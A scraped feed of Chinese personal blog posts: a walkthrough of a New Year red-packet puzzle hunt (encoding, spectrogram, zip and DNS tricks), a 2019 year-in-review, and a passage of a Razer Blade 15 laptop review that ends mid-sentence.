href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 